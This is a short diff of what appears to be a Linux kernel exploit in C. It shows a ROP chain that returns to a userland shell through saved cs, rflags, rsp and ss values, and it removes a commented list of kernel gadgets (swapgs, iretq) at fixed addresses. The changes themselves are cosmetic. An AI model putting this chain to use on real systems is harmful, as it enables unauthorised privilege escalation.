@@ -266,7 +266,7 @@ int main()
 	rop[i++] = (size_t)&shell;
 
 	rop[i++] = user_cs;		// cs
-	rop[i++] = user_rflags;	// rflags
+	rop[i++] = user_rflags;		// rflags
 	rop[i++] = user_sp;		// rsp
 	rop[i++] = user_ss;		// ss
 
@@ -874,38 +874,7 @@ int main()
 	return 0;
 }
 
-/*
-ffffffff815b27ca:	48 89 c7             	mov    %rax,%rdi
 
-ffffffff815b27cd:	48 89 d0             	mov    %rdx,%rax
-
-ffffffff815b27d0:	48 83 e0 fc          	and    $0xfffffffffffffffc,%rax
-
-ffffffff815b27d4:	49 89 c0             	mov    %rax,%r8
-
-ffffffff815b27d7:	75 e8                	jne    0xffffffff815b27c1
-
-ffffffff815b27d9:	4c 89 c0             	mov    %r8,%rax
-
-ffffffff815b27dc:	c3                   	retq   
-
-
-
-ffffffff81c010bc:	0f 01 f8             	swapgs 
-
-ffffffff81c010bf:	5d                   	pop    %rbp
-
-ffffffff81c010c0:	c3                   	retq 
-
-
-
-ffffffff8103a2ab:	48 cf                	iretq  
-
-ffffffff8103a2ad:	5d                   	pop    %rbp
-
-ffffffff8103a2ae:	c3                   	retq 
-
-*/
 ```
 
 
